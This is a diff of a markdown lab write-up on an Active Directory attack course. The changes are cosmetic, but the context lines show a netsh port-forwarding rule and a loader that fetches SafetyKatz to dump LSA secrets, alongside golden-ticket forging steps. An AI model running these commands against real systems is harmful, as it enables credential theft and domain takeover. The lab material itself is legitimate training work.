@@ -203,7 +203,7 @@ Mandatory Label\High Mandatory Level         Label            S-1-16-12288
 
 `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.22`
 
-![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_safetykatz.png)
+![HFS - SafetyKatz.exe](./assets/screenshots/learning_objective_08_hfs_safetykatz.png)
 
 `C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"`:
 ```
@@ -485,7 +485,6 @@ Now, use the generated command to forge a golden ticket. Remember to add `-path 
 
 [+] Ticket successfully imported!🎟️
 ```
-🚩
 
 `klist`:
 ```
@@ -504,6 +503,7 @@ Cached Tickets: (1)
         Cache Flags: 0x1 -> PRIMARY
         Kdc Called:
 ```
+🚩
 
 3. **Use the golden ticket to (once again) get domain admin privileges from a machine**
 
@@ -516,7 +516,7 @@ C:\Users\Administrator>
 ```
 🚀
 
-![Victim: dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--std422-student422-64b5f6?logo=windows11&logoColor=white)
+![Victim: dcorp-dc | administrator](https://custom-icon-badges.demolab.com/badge/dcorp--dc-administrator-64b5f6?logo=windows11&logoColor=white)
 
 `whoami`:
 ```
